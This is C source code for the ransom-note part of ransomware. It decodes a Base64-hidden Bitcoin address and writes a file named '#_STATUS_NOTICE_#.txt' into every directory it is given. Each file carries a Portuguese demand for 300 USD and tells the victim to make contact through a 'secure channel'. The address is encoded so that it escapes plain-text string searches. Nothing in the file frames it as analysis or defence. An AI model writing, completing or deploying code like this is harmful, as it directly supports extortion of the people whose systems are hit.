#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <limits.h>
#include <stddef.h>

/* Base64-encoded Bitcoin address: "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" */
#define BASE64_ADDR "MUExelAxZVA1UUdlZmkyRE1QVGZUTDVTTG12N0RpdmZOYQ=="

/* Base64 decoding lookup table; returns -1 for invalid character */
static int base64_val(char c) {
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return c - 'a' + 26;
    if (c >= '0' && c <= '9') return c - '0' + 52;
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

/*
 * Decode Base64 string `in` into buffer `out` of size `out_size`.
 * Returns number of decoded bytes, or -1 on error.
 * The output is NOT null-terminated.
 */
int base64_decode(const char *in, unsigned char *out, size_t out_size) {
    size_t len = strlen(in);
    if (len % 4 != 0) return -1;               /* invalid Base64 length */

    size_t out_pos = 0;
    for (size_t i = 0; i < len; i += 4) {
        int v[4];
        int pad = 0;
        for (int j = 0; j < 4; ++j) {
            char c = in[i + j];
            if (c == '=') {
                v[j] = 0;
                ++pad;
            } else {
                int val = base64_val(c);
                if (val < 0) return -1;       /* invalid character */
                v[j] = val;
            }
        }
        if (pad > 2) return -1;               /* too many padding chars */

        /* Check buffer space for up to 3 output bytes */
        if (out_pos + 3 > out_size) return -1;

        unsigned char b0 = (v[0] << 2) | (v[1] >> 4);
        unsigned char b1 = (v[1] << 4) | (v[2] >> 2);
        unsigned char b2 = (v[2] << 6) | v[3];

        out[out_pos++] = b0;
        if (pad < 2) out[out_pos++] = b1;
        if (pad < 1) out[out_pos++] = b2;
    }
    return (int)out_pos;
}

/*
 * For each directory in `directories`, create/overwrite a file named
 * "#_STATUS_NOTICE_#.txt" containing the notification message.
 * Returns 0 on full success, -1 on any I/O error.
 */
int write_manifest(const char * const *directories, size_t count) {
    const char *prefix = "Solicite 300 USD em payment service para ";
    const char *suffix = " e instrua contato via secure channel.";

    /* Decode the Base64 address once */
    unsigned char decoded_addr[64];
    int addr_len = base64_decode(BASE64_ADDR, decoded_addr, sizeof(decoded_addr) - 1);
    if (addr_len < 0) {
        fprintf(stderr, "Failed to decode Base64 address\n");
        return -1;
    }
    decoded_addr[addr_len] = '\0';   /* null-terminate for string handling */

    size_t prefix_len = strlen(prefix);
    size_t suffix_len = strlen(suffix);
    size_t total_len = prefix_len + (size_t)addr_len + suffix_len;

    /* Build the message buffer once */
    char *message = malloc(total_len + 1);
    if (!message) {
        fprintf(stderr, "Memory allocation failed\n");
        return -1;
    }
    snprintf(message, total_len + 1, "%s%s%s",
             prefix, (const char *)decoded_addr, suffix);

    for (size_t i = 0; i < count; ++i) {
        char path[PATH_MAX];
        int ret = snprintf(path, sizeof(path), "%s/%s",
                           directories[i], "#_STATUS_NOTICE_#.txt");
        if (ret < 0 || (size_t)ret >= sizeof(path)) {
            fprintf(stderr, "Path too long: %s\n", directories[i]);
            free(message);
            return -1;
        }

        FILE *f = fopen(path, "wb");
        if (!f) {
            fprintf(stderr, "Error opening %s: %s\n", path, strerror(errno));
            free(message);
            return -1;
        }

        if (fwrite(message, 1, total_len, f) != total_len) {
            fprintf(stderr, "Error writing to %s\n", path);
            fclose(f);
            free(message);
            return -1;
        }

        fclose(f);
    }

    free(message);
    return 0;
}